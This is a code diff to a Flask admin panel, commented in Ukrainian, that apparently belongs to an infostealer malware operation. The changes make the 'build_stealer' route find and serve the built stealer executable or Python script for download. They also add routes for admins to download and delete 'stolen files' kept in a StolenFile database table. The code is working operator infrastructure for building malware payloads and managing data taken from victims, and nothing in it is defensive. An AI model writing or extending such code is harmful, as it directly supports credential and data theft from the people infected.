@@ -13,6 +13,10 @@ import asyncio
 admin_bp = Blueprint('admin', __name__)
 logger = logging.getLogger(__name__)
 
+def file_exists(file_path):
+    """Перевірка чи файл існує"""
+    return os.path.exists(file_path)
+
 # Допоміжна функція для перевірки авторизації
 def login_required(f):
     @wraps(f)
@@ -512,9 +516,7 @@ def build_stealer():
         features = request.form.getlist('features')
         
         logger.info(f"Building stealer for admin {session.get('admin_username')}")
-        logger.info(f"Features: {features}")
         
-        # Викликаємо білдер стіллера
         from core.stealer_builder import stealer_builder
         
         stealer_config = {
@@ -529,8 +531,30 @@ def build_stealer():
         success = stealer_builder.build_stealer(stealer_config, output_path)
         
         if success:
-            # Завантажуємо .exe файл в браузер
-            return send_file(output_path, as_attachment=True)
+            # Перевіряємо різні можливі місця .exe файлу
+            possible_paths = [
+                output_path,  # client/dist/
+                f"dist/{filename}.exe",  # стандартний dist/
+                f"build/{filename}/{filename}.exe",  # build папка
+            ]
+            
+            exe_path = None
+            for path in possible_paths:
+                if os.path.exists(path):
+                    exe_path = path
+                    break
+            
+            if exe_path and os.path.exists(exe_path):
+                flash(f'Стіллер успішно збудовано!', 'success')
+                return send_file(exe_path, as_attachment=True)
+            else:
+                # Якщо .exe не знайдено, шукаємо .py файл
+                py_path = output_path.replace('.exe', '.py')
+                if os.path.exists(py_path):
+                    flash('Стіллер збудовано як Python скрипт (.py)', 'info')
+                    return send_file(py_path, as_attachment=True)
+                else:
+                    flash('Помилка: файл не знайдено після збірки', 'danger')
         else:
             flash('Помилка при побудові стіллера', 'danger')
             
@@ -598,6 +622,91 @@ def download_all_files():
     except Exception as e:
         logger.error(f"Download all files error: {e}")
         flash('Помилка при створенні архіву', 'danger')
+        return redirect(url_for('admin.admin_stealer'))
+    finally:
+        db_session.close()
+    
+# Додай цю функцію в контекст шаблону
+@admin_bp.context_processor
+def utility_processor():
+    return dict(file_exists=file_exists)
+
+@admin_bp.route('/stealer/delete/<int:file_id>', methods=['DELETE'])
+@login_required
+def delete_stolen_file(file_id):
+    """Видалення вкраденого файлу"""
+    db_session = db_manager.get_session()
+    try:
+        file = db_session.query(StolenFile).filter_by(id=file_id, admin_id=session.get('admin_id')).first()
+        
+        if file:
+            # Видаляємо фізичний файл
+            if os.path.exists(file.file_path):
+                os.remove(file.file_path)
+            
+            # Видаляємо запис з БД
+            db_session.delete(file)
+            db_session.commit()
+            
+            logger.info(f"File deleted: {file.file_path}")
+            return jsonify({'success': True, 'message': 'Файл видалено'})
+        else:
+            return jsonify({'success': False, 'error': 'Файл не знайдено'})
+            
+    except Exception as e:
+        db_session.rollback()
+        logger.error(f"Delete file error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+    finally:
+        db_session.close()
+
+@admin_bp.route('/stealer/delete_all', methods=['DELETE'])
+@login_required
+def delete_all_stolen_files():
+    """Видалення всіх вкрадених файлів"""
+    db_session = db_manager.get_session()
+    try:
+        files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
+        deleted_count = 0
+        
+        for file in files:
+            # Видаляємо фізичний файл
+            if os.path.exists(file.file_path):
+                os.remove(file.file_path)
+            
+            # Видаляємо запис з БД
+            db_session.delete(file)
+            deleted_count += 1
+        
+        db_session.commit()
+        
+        logger.info(f"Deleted {deleted_count} files")
+        return jsonify({'success': True, 'message': f'Видалено {deleted_count} файлів', 'deleted_count': deleted_count})
+            
+    except Exception as e:
+        db_session.rollback()
+        logger.error(f"Delete all files error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+    finally:
+        db_session.close()
+
+@admin_bp.route('/stealer/download/<int:file_id>')
+@login_required
+def download_stolen_file(file_id):
+    """Завантаження окремого файлу"""
+    db_session = db_manager.get_session()
+    try:
+        file = db_session.query(StolenFile).filter_by(id=file_id, admin_id=session.get('admin_id')).first()
+        
+        if file and os.path.exists(file.file_path):
+            return send_file(file.file_path, as_attachment=True, download_name=os.path.basename(file.file_path))
+        else:
+            flash('Файл не знайдено', 'danger')
+            return redirect(url_for('admin.admin_stealer'))
+            
+    except Exception as e:
+        logger.error(f"Download file error: {e}")
+        flash('Помилка завантаження файлу', 'danger')
         return redirect(url_for('admin.admin_stealer'))
     finally:
         db_session.close()
